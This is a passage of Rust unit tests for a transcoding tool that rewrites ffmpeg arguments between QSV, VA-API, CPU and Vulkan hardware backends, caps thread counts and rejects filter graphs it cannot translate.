        // `-qsv_device` without `-init_hw_device vaapi=...` synthesizes `-init_hw_device vaapi=va:<node>`.
        let qsv_dev_only = vec_s(&[
            "-qsv_device",
            "/dev/dri/renderD128",
            "-filter_hw_device",
            "ocl",
            "-i",
            "/srv/media/a.mkv",
            "-vf",
            "vpp_qsv=w=1920:h=1080:format=nv12:framerate=24",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let adapted2 = adapt_args_for_backend(
            &qsv_dev_only,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD129"),
        )
        .expect("adapt -qsv_device to VA-API");
        assert_eq!(
            adapted2,
            vec_s(&[
                "-init_hw_device",
                "vaapi=va:/dev/dri/renderD129",
                "-filter_hw_device",
                "ocl",
                "-i",
                "/srv/media/a.mkv",
                "-vf",
                "scale_vaapi=w=1920:h=1080:format=nv12,fps=24",
                "-c:v",
                "h264_vaapi",
                "out.m3u8",
            ])
        );

        // Unsupported vpp_qsv option (`tonemap=`) and unknown `*_qsv` filter bail with Err.
        let vpp_tonemap = vec_s(&[
            "-qsv_device",
            "/dev/dri/renderD128",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            "vpp_qsv=tonemap=1:format=nv12",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        assert!(adapt_args_for_backend(&vpp_tonemap, AdaptedTargetBackend::Vaapi, None).is_err());

        let unknown_qsv = vec_s(&[
            "-qsv_device",
            "/dev/dri/renderD128",
            "-i",
            "/srv/media/a.mkv",
            "-vf",
            "sharpness_qsv=1",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        assert!(adapt_args_for_backend(&unknown_qsv, AdaptedTargetBackend::Vaapi, None).is_err());
    }

    #[test]
    fn adapt_args_vaapi_to_qsv_rewrites_clean_pipeline_and_rejects_mixed_or_tonemap() {
        let vaapi_args = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128,driver=iHD",
            "-filter_hw_device",
            "va",
            "-hwaccel",
            "vaapi",
            "-hwaccel_output_format",
            "vaapi",
            "-c:v",
            "hevc",
            "-i",
            "/srv/media/movie.mkv",
            "-vf",
            "deinterlace_vaapi,scale_vaapi=w=1920:h=1080:format=nv12,format=vaapi",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        let adapted = adapt_args_for_backend(
            &vaapi_args,
            AdaptedTargetBackend::Qsv,
            Some("/dev/dri/renderD129"),
        )
        .expect("adapt clean VA-API to QSV");
        assert_eq!(
            adapted,
            vec_s(&[
                "-init_hw_device",
                "vaapi=va:/dev/dri/renderD129,driver=iHD",
                "-init_hw_device",
                "qsv=qs@va",
                "-filter_hw_device",
                "qs",
                "-hwaccel",
                "qsv",
                "-hwaccel_output_format",
                "qsv",
                "-c:v",
                "hevc_qsv",
                "-i",
                "/srv/media/movie.mkv",
                "-vf",
                "deinterlace_qsv,scale_qsv=w=1920:h=1080:format=nv12,format=qsv",
                "-c:v",
                "h264_qsv",
                "out.m3u8",
            ])
        );

        // Reject tonemap_vaapi, opencl, and vulkan/libplacebo pipelines.
        for bad_graph in [
            "tonemap_vaapi=format=nv12",
            "hwmap=derive_device=opencl,tonemap_opencl=format=nv12",
            "hwmap=derive_device=vulkan,libplacebo=tonemapping=bt2390",
            "overlay_vaapi=x=0:y=0",
        ] {
            let args = vec_s(&[
                "-vaapi_device",
                "/dev/dri/renderD128",
                "-i",
                "/srv/media/a.mkv",
                "-vf",
                bad_graph,
                "-c:v",
                "h264_vaapi",
                "out.m3u8",
            ]);
            assert!(
                adapt_args_for_backend(&args, AdaptedTargetBackend::Qsv, None).is_err(),
                "expected Err adapting '{bad_graph}' to QSV"
            );
        }
    }

    #[test]
    fn adapt_args_hw_to_cpu_strips_gpu_flags_rewrites_filters_and_rejects_gpu_tonemap() {
        let vaapi_sub = vec_s(&[
            "-vaapi_device",
            "/dev/dri/renderD128",
            "-hwaccel",
            "vaapi",
            "-hwaccel_output_format",
            "vaapi",
            "-extra_hw_frames",
            "24",
            "-c:v",
            "hevc_qsv",
            "-i",
            "/srv/media/anime.mkv",
            "-filter_complex",
            "[0:v]scale_vaapi=w=1920:h=1080:format=p010,hwdownload,subtitles=filename='/var/cache/jellyfin/ep1.ass',hwupload[out]",
            "-map",
            "[out]",
            "-c:v",
            "h264_vaapi",
            "-rc_mode",
            "CQP",
            "-qp",
            "22",
            "out.m3u8",
        ]);
        let cpu = adapt_args_for_backend(&vaapi_sub, AdaptedTargetBackend::Cpu, None)
            .expect("adapt VA-API + subtitles to CPU");
        assert_eq!(
            cpu,
            vec_s(&[
                "-c:v",
                "hevc",
                "-i",
                "/srv/media/anime.mkv",
                "-filter_complex",
                "[0:v]scale=w=1920:h=1080,format=yuv420p,subtitles=filename='/var/cache/jellyfin/ep1.ass'[out]",
                "-map",
                "[out]",
                "-c:v",
                "libx264",
                "-preset",
                "veryfast",
                "out.m3u8",
            ])
        );

        // Stripping hwupload/format=vaapi ensures format=yuv420p is present.
        let bare_hw = vec_s(&[
            "-vaapi_device",
            "/dev/dri/renderD128",
            "-i",
            "/srv/media/a.mkv",
            "-vf",
            "hwupload,format=vaapi",
            "-c:v",
            "hevc_vaapi",
            "out.m3u8",
        ]);
        let bare_cpu = adapt_args_for_backend(&bare_hw, AdaptedTargetBackend::Cpu, None)
            .expect("adapt bare hwupload to CPU");
        assert_eq!(
            bare_cpu,
            vec_s(&[
                "-i",
                "/srv/media/a.mkv",
                "-vf",
                "format=yuv420p",
                "-c:v",
                "libx265",
                "-preset",
                "veryfast",
                "out.m3u8",
            ])
        );

        // GPU-only tonemap/overlay filters bail with Err.
        for gpu_only in [
            "tonemap_opencl=format=nv12",
            "tonemap_vaapi=format=nv12",
            "libplacebo=tonemapping=bt2390",
            "overlay_vaapi=x=0:y=0",
            "overlay_qsv=x=0:y=0",
            "overlay_cuda=x=0:y=0",
            "overlay_opencl=x=0:y=0",
        ] {
            let args = vec_s(&[
                "-vaapi_device",
                "/dev/dri/renderD128",
                "-i",
                "/srv/media/hdr.mkv",
                "-vf",
                gpu_only,
                "-c:v",
                "h264_vaapi",
                "out.m3u8",
            ]);
            assert!(
                adapt_args_for_backend(&args, AdaptedTargetBackend::Cpu, None).is_err(),
                "expected Err adapting '{gpu_only}' to CPU"
            );
        }
    }

    #[test]
    fn apply_ffmpeg_thread_cap_clamps_and_injects_without_corrupting_values() {
        // Injects input and output -threads when absent.
        let injected = apply_ffmpeg_thread_cap(
            &[
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-metadata",
                "title=-i",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            injected,
            vec_s(&[
                "-threads",
                "4",
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "libx264",
                "-threads",
                "4",
                "-metadata",
                "title=-i",
                "out.m3u8",
            ])
        );

        // Clamps 0 and >max, preserves smaller explicit positive values.
        let clamped = apply_ffmpeg_thread_cap(
            &[
                "-threads",
                "0",
                "-i",
                "/srv/media/a.mkv",
                "-filter_threads",
                "16",
                "-filter_complex_threads",
                "0",
                "-c:v",
                "libx264",
                "-threads",
                "2",
                "out.m3u8",
            ],
            4,
        );
        assert_eq!(
            clamped,
            vec_s(&[
                "-threads",
                "4",
                "-i",
                "/srv/media/a.mkv",
                "-filter_threads",
                "4",
                "-filter_complex_threads",
                "4",
                "-c:v",
                "libx264",
                "-threads",
                "2",
                "out.m3u8",
            ])
        );

        // No -c:v inserts output -threads before final output (or before `--`).
        let no_vcodec = apply_ffmpeg_thread_cap(
            &["-threads", "2", "-i", "/srv/media/a.mkv", "-f", "null", "-"],
            4,
        );
        assert_eq!(
            no_vcodec,
            vec_s(&[
                "-threads",
                "2",
                "-i",
                "/srv/media/a.mkv",
                "-f",
                "null",
                "-threads",
                "4",
                "-",
            ])
        );

        // max_threads=0 clamps safely to 1.
        let min_one = apply_ffmpeg_thread_cap(&["-threads", "8", "-i", "in.mkv", "out.mkv"], 0);
        assert_eq!(
            min_one,
            vec_s(&["-threads", "1", "-i", "in.mkv", "-threads", "1", "out.mkv"])
        );
    }

    #[test]
    fn optimize_vulkan_tonemap_patterns_and_safety_guards() {
        // Pattern A: libplacebo with w/h and tonemapping.
        let pat_a = "setparams=color_primaries=bt2020,hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:format=nv12:tonemapping=bt.2390:color_primaries=bt709,hwmap=derive_device=vaapi:reverse=1";
        assert_eq!(
            optimize_vulkan_tonemap_filtergraph(pat_a).as_deref(),
            Some(
                "setparams=color_primaries=bt2020,scale_vaapi=w=1920:h=1080:format=p010,hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:format=nv12:tonemapping=bt.2390:color_primaries=bt709,hwmap=derive_device=vaapi:reverse=1"
            )
        );

        // Pattern A with -2 aspect dimension and explicit force_original_aspect_ratio=disable.
        let pat_a_neg2 = "hwmap=derive_device=vulkan,libplacebo=w=1280:h=-2:force_original_aspect_ratio=disable:tonemapping=hable";
        assert_eq!(
            optimize_vulkan_tonemap_filtergraph(pat_a_neg2).as_deref(),
            Some(
                "scale_vaapi=w=1280:h=-2:format=p010,hwmap=derive_device=vulkan,libplacebo=w=1280:h=-2:force_original_aspect_ratio=disable:tonemapping=hable"
            )
        );

        // Pattern B with format= simplifies scale_vulkan to format only.
        let pat_b_fmt = "hwmap=derive_device=vulkan,libplacebo=tonemapping=bt.2390:colorspace=bt709,scale_vulkan=w=1920:h=1080:format=nv12,hwmap=derive_device=vaapi:reverse=1";
        assert_eq!(
            optimize_vulkan_tonemap_filtergraph(pat_b_fmt).as_deref(),
            Some(
                "scale_vaapi=w=1920:h=1080:format=p010,hwmap=derive_device=vulkan,libplacebo=tonemapping=bt.2390:colorspace=bt709,scale_vulkan=format=nv12,hwmap=derive_device=vaapi:reverse=1"
            )
        );

        // Pattern B with only w/h removes scale_vulkan completely.
        let pat_b_only_wh = "hwmap=derive_device=vulkan,libplacebo=tonemapping=bt.2390,scale_vulkan=w=1280:h=720,hwmap=derive_device=vaapi:reverse=1";
        assert_eq!(
            optimize_vulkan_tonemap_filtergraph(pat_b_only_wh).as_deref(),
            Some(
                "scale_vaapi=w=1280:h=720:format=p010,hwmap=derive_device=vulkan,libplacebo=tonemapping=bt.2390,hwmap=derive_device=vaapi:reverse=1"
            )
        );

        // Safety guards: all must return None.
        for unsafe_graph in [
            // Multi-branch `;`
            "[0:v]hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable[v];[v][1:s]overlay[out]",
            // scale_vaapi already precedes hwmap
            "scale_vaapi=w=1920:h=1080:format=p010,hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable",
            // Post-libplacebo subtitle/crop/pad/transpose/rotate/deinterlace
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable,hwdownload,subtitles=f=/tmp/a.ass",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable,crop=1280:720:0:0",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable,pad=1920:1080",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable,transpose=1",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable,rotate=PI/2",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=hable,deinterlace_vaapi",
            // Crop/aspect params inside libplacebo
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:crop_w=1920:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:pad_crop_ratio=0.5:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:force_original_aspect_ratio=decrease:tonemapping=hable",
            // Expression dims
            "hwmap=derive_device=vulkan,libplacebo=w=iw/2:h=ih/2:tonemapping=hable",
        ] {
            assert_eq!(
                optimize_vulkan_tonemap_filtergraph(unsafe_graph),
                None,
                "expected None for '{unsafe_graph}'"
            );
        }

        // optimize_vulkan_tonemap_args applies only when VA-API frames are proven to enter hwmap.
        let vaapi_vk_args = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-init_hw_device",
            "vulkan=vk@va",
            "-filter_hw_device",
            "va",
            "-hwaccel",
            "vaapi",
            "-hwaccel_output_format",
            "vaapi",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            pat_a,
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        let opt_args = optimize_vulkan_tonemap_args(&vaapi_vk_args);
        let opt_vf_idx = opt_args
            .iter()
            .position(|a| a == "-vf")
            .expect("-vf present")
            + 1;
        assert!(opt_args[opt_vf_idx].starts_with(
            "setparams=color_primaries=bt2020,scale_vaapi=w=1920:h=1080:format=p010,hwmap=derive_device=vulkan"
        ));

        // Without VA-API setup (or on QSV+Vulkan frames), args remain unchanged.
        let vk_only_args = vec_s(&[
            "-init_hw_device",
            "vulkan=vk:0",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            pat_a,
            "-c:v",
            "libx264",
            "out.m3u8",
        ]);
        assert_eq!(optimize_vulkan_tonemap_args(&vk_only_args), vk_only_args);

        let qsv_vk_args = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-init_hw_device",
            "qsv=qs@va",
            "-init_hw_device",
            "vulkan=vk@va",
            "-hwaccel",
            "qsv",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            pat_a,
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        assert_eq!(optimize_vulkan_tonemap_args(&qsv_vk_args), qsv_vk_args);
    }

    #[test]
    fn explicit_filter_option_translation_deinterlace_and_overlay() {
        // 1. deinterlace_qsv -> deinterlace_vaapi
        let qsv_deint_adv = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128,driver=iHD",
            "-init_hw_device",
            "qsv=qs@va",
            "-filter_hw_device",
            "qs",
            "-hwaccel",
            "qsv",
            "-hwaccel_output_format",
            "qsv",
            "-i",
            "/srv/media/interlaced.ts",
            "-vf",
            "deinterlace_qsv=mode=advanced:async_depth=4",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let va_adv = adapt_args_for_backend(
            &qsv_deint_adv,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD128"),
        )
        .expect("deinterlace_qsv mode=advanced adapts cleanly");
        assert!(
            va_adv.contains(&"deinterlace_vaapi=mode=motion_adaptive".to_string()),
            "got: {va_adv:?}"
        );

        let qsv_deint_bob = vec_s(&[
            "-qsv_device",
            "/dev/dri/renderD128",
            "-i",
            "/srv/media/interlaced.ts",
            "-vf",
            "deinterlace_qsv=mode=1:async_depth=2",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let va_bob = adapt_args_for_backend(
            &qsv_deint_bob,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD128"),
        )
        .expect("deinterlace_qsv mode=1 adapts to mode=bob");
        assert!(va_bob.contains(&"deinterlace_vaapi=mode=bob".to_string()));

        let qsv_deint_only_async = vec_s(&[
            "-qsv_device",
            "/dev/dri/renderD128",
            "-i",
            "/srv/media/interlaced.ts",
            "-vf",
            "deinterlace_qsv=async_depth=4",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let va_only_async = adapt_args_for_backend(
            &qsv_deint_only_async,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD128"),
        )
        .expect("deinterlace_qsv async_depth-only strips option cleanly");
        assert!(va_only_async.contains(&"deinterlace_vaapi".to_string()));

        // Reject unknown deinterlace_qsv options / modes
        for bad in [
            "deinterlace_qsv=mode=weave",
            "deinterlace_qsv=rate=field",
            "deinterlace_qsv=unknown=1",
            "deinterlace_qsv=advanced",
        ] {
            let args = vec_s(&[
                "-qsv_device",
                "/dev/dri/renderD128",
                "-i",
                "/srv/media/a.ts",
                "-vf",
                bad,
                "-c:v",
                "h264_qsv",
                "out.m3u8",
            ]);
            assert!(
                adapt_args_for_backend(&args, AdaptedTargetBackend::Vaapi, None).is_err(),
                "expected Err for '{bad}'"
            );
        }

        // 2. deinterlace_vaapi -> deinterlace_qsv
        for (va_filter, expected_qsv_filter) in [
            ("deinterlace_vaapi=mode=bob", "deinterlace_qsv=mode=bob"),
            (
                "deinterlace_vaapi=mode=default:rate=frame:auto=0",
                "deinterlace_qsv=mode=advanced",
            ),
            (
                "deinterlace_vaapi=mode=motion_adaptive",
                "deinterlace_qsv=mode=advanced",
            ),
            (
                "deinterlace_vaapi=mode=motion_compensated:auto=0",
                "deinterlace_qsv=mode=advanced",
            ),
            ("deinterlace_vaapi=rate=frame:auto=0", "deinterlace_qsv"),
        ] {
            let args = vec_s(&[
                "-vaapi_device",
                "/dev/dri/renderD128",
                "-i",
                "/srv/media/a.ts",
                "-vf",
                va_filter,
                "-c:v",
                "h264_vaapi",
                "out.m3u8",
            ]);
            let adapted = adapt_args_for_backend(
                &args,
                AdaptedTargetBackend::Qsv,
                Some("/dev/dri/renderD128"),
            )
            .unwrap_or_else(|e| panic!("expected Ok for '{va_filter}': {e}"));
            assert!(
                adapted.contains(&expected_qsv_filter.to_string()),
                "for '{va_filter}' expected '{expected_qsv_filter}', got {adapted:?}"
            );
        }

        // Reject untranslatable deinterlace_vaapi options (must fail closed so PreferQsv stays Native)
        for bad in [
            "deinterlace_vaapi=rate=field:auto=1",
            "deinterlace_vaapi=rate=field",
            "deinterlace_vaapi=auto=1",
            "deinterlace_vaapi=mode=weave",
            "deinterlace_vaapi=unknown=1",
            "deinterlace_vaapi=bob",
        ] {
            let args = vec_s(&[
                "-vaapi_device",
                "/dev/dri/renderD128",
                "-i",
                "/srv/media/a.ts",
                "-vf",
                bad,
                "-c:v",
                "h264_vaapi",
                "out.m3u8",
            ]);
            assert!(
                adapt_args_for_backend(&args, AdaptedTargetBackend::Qsv, None).is_err(),
                "expected Err for '{bad}'"
            );
        }

        // Verify plan_backend_adaptation in PreferQsv falls back to Native on deinterlace_vaapi=rate=field:auto=1
        let intel_node = af_hardware::RenderNode {
            path: std::path::PathBuf::from("/dev/dri/renderD128"),
            vendor_id: Some("0x8086".to_string()),
        };
        let intel_encoders = vec_s(&["h264_vaapi", "h264_qsv", "libx264"]);
        let field_deint = vec_s(&[
            "-vaapi_device",
            "/dev/dri/renderD128",
            "-hwaccel",
            "vaapi",
            "-i",
            "/srv/media/a.ts",
            "-vf",
            "deinterlace_vaapi=rate=field:auto=1",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        let field_cap = required_capability(&field_deint);
        assert_eq!(
            plan_backend_adaptation(
                &field_deint,
                &field_cap,
                BackendAdaptMode::PreferQsv,
                &intel_encoders,
                &[],
                std::slice::from_ref(&intel_node),
            ),
            Some(AdaptedTargetBackend::Native)
        );

        // 3. overlay_qsv -> overlay_vaapi
        let overlay_qsv = vec_s(&[
            "-qsv_device",
            "/dev/dri/renderD128",
            "-i",
            "/srv/media/v.mkv",
            "-i",
            "/srv/media/s.mkv",
            "-filter_complex",
            "[0:v][1:v]overlay_qsv=x=10:y=20:w=640:h=360:alpha=128:eof_action=repeat:shortest=1:repeatlast=0:ts_sync_mode=nearest[out]",
            "-map",
            "[out]",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let overlay_va = adapt_args_for_backend(
            &overlay_qsv,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD128"),
        )
        .expect("overlay_qsv adapts cleanly");
        assert!(
            overlay_va.contains(&"[0:v][1:v]overlay_vaapi=x=10:y=20:w=640:h=360:alpha=0.501961:eof_action=repeat:shortest=1:repeatlast=0:ts_sync_mode=nearest[out]".to_string()),
            "got: {overlay_va:?}"
        );

        // Edge alpha values 0 and 255
        for (qsv_alpha, va_alpha) in [("0", "0"), ("255", "1"), ("51", "0.2")] {
            let args = vec_s(&[
                "-qsv_device",
                "/dev/dri/renderD128",
                "-i",
                "/srv/media/v.mkv",
                "-filter_complex",
                &format!("[0:v][1:v]overlay_qsv=alpha={qsv_alpha}[out]"),
                "-c:v",
                "h264_qsv",
                "out.m3u8",
            ]);
            let adapted = adapt_args_for_backend(
                &args,
                AdaptedTargetBackend::Vaapi,
                Some("/dev/dri/renderD128"),
            )
            .expect("valid alpha");
            assert!(
                adapted.contains(&format!("[0:v][1:v]overlay_vaapi=alpha={va_alpha}[out]")),
                "got: {adapted:?}"
            );
        }

        // Out-of-range / unparseable alpha and unknown overlay_qsv keys fail closed
        for bad in [
            "[0:v][1:v]overlay_qsv=alpha=256[out]",
            "[0:v][1:v]overlay_qsv=alpha=-1[out]",
            "[0:v][1:v]overlay_qsv=alpha=0.5[out]",
            "[0:v][1:v]overlay_qsv=alpha=abc[out]",
            "[0:v][1:v]overlay_qsv=eval=frame[out]",
            "[0:v][1:v]overlay_qsv=10:20[out]",
        ] {
            let args = vec_s(&[
                "-qsv_device",
                "/dev/dri/renderD128",
                "-i",
                "/srv/media/v.mkv",
                "-filter_complex",
                bad,
                "-c:v",
                "h264_qsv",
                "out.m3u8",
            ]);
            assert!(
                adapt_args_for_backend(&args, AdaptedTargetBackend::Vaapi, None).is_err(),
                "expected Err for '{bad}'"
            );
        }
    }

    #[test]
    fn optimize_vulkan_tonemap_rejects_non_vaapi_frames_and_geometry_options() {
        let base_vf = "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:tonemapping=bt.2390:format=nv12,hwmap=derive_device=vaapi:reverse=1";

        // 1. Software decode + VA-API encode (no -hwaccel vaapi, no hwupload) -> MUST NOT rewrite!
        let sw_dec_vaapi_enc = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-init_hw_device",
            "vulkan=vk@va",
            "-filter_hw_device",
            "va",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            base_vf,
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        assert_eq!(
            optimize_vulkan_tonemap_args(&sw_dec_vaapi_enc),
            sw_dec_vaapi_enc
        );

        // 2. -hwaccel vaapi WITHOUT -hwaccel_output_format vaapi -> MUST NOT rewrite!
        let missing_out_fmt = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-init_hw_device",
            "vulkan=vk@va",
            "-filter_hw_device",
            "va",
            "-hwaccel",
            "vaapi",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            base_vf,
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        assert_eq!(
            optimize_vulkan_tonemap_args(&missing_out_fmt),
            missing_out_fmt
        );

        // 3. hwdownload before hwmap=derive_device=vulkan without subsequent VA-API hwupload -> MUST NOT rewrite!
        let hwdownload_before = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-init_hw_device",
            "vulkan=vk@va",
            "-filter_hw_device",
            "va",
            "-hwaccel",
            "vaapi",
            "-hwaccel_output_format",
            "vaapi",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            &format!("hwdownload,format=nv12,{base_vf}"),
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        assert_eq!(
            optimize_vulkan_tonemap_args(&hwdownload_before),
            hwdownload_before
        );

        // 4. Software decode + explicit VA-API hwupload before hwmap -> DOES optimize (inserts scale_vaapi after hwupload)!
        let sw_dec_with_vaapi_upload = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-init_hw_device",
            "vulkan=vk@va",
            "-filter_hw_device",
            "va",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            &format!("format=p010,hwupload,{base_vf}"),
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        let opt_upload = optimize_vulkan_tonemap_args(&sw_dec_with_vaapi_upload);
        let vf_idx = opt_upload.iter().position(|a| a == "-vf").unwrap() + 1;
        assert_eq!(
            opt_upload[vf_idx],
            format!("format=p010,hwupload,scale_vaapi=w=1920:h=1080:format=p010,{base_vf}")
        );

        // 5. hwupload targeting Vulkan (derive_device=vulkan or -filter_hw_device vk) -> MUST NOT rewrite!
        let vk_hwupload = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-init_hw_device",
            "vulkan=vk@va",
            "-filter_hw_device",
            "vk",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            &format!("format=p010,hwupload,{base_vf}"),
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        assert_eq!(optimize_vulkan_tonemap_args(&vk_hwupload), vk_hwupload);

        // 6. Pre-hwmap software pixel filters / another hwmap / derive_device=vulkan hwupload -> MUST return None
        for unsafe_pre in [
            format!("hwdownload,{base_vf}"),
            format!("format=nv12,{base_vf}"),
            format!("subtitles=f=/tmp/a.ass,{base_vf}"),
            format!("ass=/tmp/a.ass,{base_vf}"),
            format!("yadif,{base_vf}"),
            format!("bwdif,{base_vf}"),
            format!("hwmap=derive_device=opencl,{base_vf}"),
            format!("hwupload=derive_device=vulkan,{base_vf}"),
        ] {
            assert_eq!(
                optimize_vulkan_tonemap_filtergraph(&unsafe_pre),
                None,
                "expected None for pre-hwmap graph '{unsafe_pre}'"
            );
        }

        // 7. libplacebo geometry / SAR / fit_mode / force_divisible_by guards -> MUST return None
        for unsafe_placebo in [
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:fit_mode=contain:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:fit_mode=cover:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:normalize_sar=true:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:normalize_sar=1:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:reset_sar=yes:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:reset_sar=on:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:crop_x=10:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:crop_y=10:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:pos_x=0:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:pos_y=0:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:pos_w=1920:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:pos_h=1080:tonemapping=hable",
            "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:force_divisible_by=2:tonemapping=hable",
        ] {
            assert_eq!(
                optimize_vulkan_tonemap_filtergraph(unsafe_placebo),
                None,
                "expected None for libplacebo geometry graph '{unsafe_placebo}'"
            );
        }

        // Default safe values for those options are still allowed
        let safe_defaults = "hwmap=derive_device=vulkan,libplacebo=w=1920:h=1080:fit_mode=fill:normalize_sar=0:reset_sar=false:force_original_aspect_ratio=0:force_divisible_by=1:tonemapping=bt.2390";
        assert!(optimize_vulkan_tonemap_filtergraph(safe_defaults).is_some());
    }

    #[test]
    fn adapt_qsv_to_vaapi_handles_unnamed_vaapi_init_and_other_init_hw_devices() {
        // 1. Unnamed `-init_hw_device vaapi:/dev/dri/renderD128,driver=iHD` paired with `-init_hw_device qsv=qs@va`
        //    and `-filter_hw_device qs` gets named `vaapi=va:<node>` matching `-filter_hw_device va`.
        let unnamed_vaapi = vec_s(&[
            "-init_hw_device",
            "vaapi:/dev/dri/renderD128,driver=iHD",
            "-init_hw_device",
            "qsv=qs@vaapi0",
            "-filter_hw_device",
            "qs",
            "-hwaccel",
            "qsv",
            "-hwaccel_output_format",
            "qsv",
            "-i",
            "/srv/media/in.mkv",
            "-vf",
            "vpp_qsv=w=1280:h=720:format=nv12",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let adapted = adapt_args_for_backend(
            &unnamed_vaapi,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD129"),
        )
        .expect("unnamed vaapi init adapts cleanly");
        assert_eq!(
            adapted,
            vec_s(&[
                "-init_hw_device",
                "vaapi=va:/dev/dri/renderD129",
                "-filter_hw_device",
                "va",
                "-hwaccel",
                "vaapi",
                "-hwaccel_output_format",
                "vaapi",
                "-i",
                "/srv/media/in.mkv",
                "-vf",
                "scale_vaapi=w=1280:h=720:format=nv12",
                "-c:v",
                "h264_vaapi",
                "out.m3u8",
            ])
        );

        // 2. Non-VAAPI/non-QSV `-init_hw_device` entries rewrite `:device` render node AND split `,options`
        //    before replacing `@<qsv_name>` -> `@<vaapi_dev_name>`.
        let other_devices = vec_s(&[
            "-init_hw_device",
            "vaapi=va0:/dev/dri/renderD128,driver=iHD",
            "-init_hw_device",
            "qsv=qs@va0",
            "-init_hw_device",
            "vulkan=vk:/dev/dri/renderD128,linear_images=1",
            "-init_hw_device",
            "opencl=ocl@qs,vendor_id=0x8086",
            "-init_hw_device",
            "opencl=ocl_direct:0.0",
            "-filter_hw_device",
            "qs",
            "-hwaccel",
            "qsv",
            "-i",
            "/srv/media/in.mkv",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let adapted_other = adapt_args_for_backend(
            &other_devices,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD129"),
        )
        .expect("other -init_hw_device specs rewrite cleanly");
        assert!(
            adapted_other.contains(&"vulkan=vk:/dev/dri/renderD129,linear_images=1".to_string()),
            "got: {adapted_other:?}"
        );
        assert!(
            adapted_other.contains(&"opencl=ocl@va0,vendor_id=0x8086".to_string()),
            "got: {adapted_other:?}"
        );
        assert!(
